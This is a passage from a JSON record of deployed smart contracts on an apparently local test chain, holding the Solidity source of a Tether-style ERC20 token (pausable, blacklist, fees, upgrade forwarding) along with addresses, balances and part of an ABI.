}\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "SafeMath",\n      "address": "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7",\n      "abi": [],\n      "functions": [],\n      "events": [],\n      "accounts_balances": {\n        "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99873536340000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "TetherToken",\n      "address": "0xe982E462b094850F12AF94d21D470e21bE9D0E9C",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "name",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "name": "deprecate",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "approve",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "deprecated",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "name": "addBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transferFrom",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "upgradedAddress",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "decimals",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "maximumFee",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "_totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "name": "getBlackListStatus",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "allowed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "name": "balanceOf",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "getOwner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "symbol",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transfer",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": 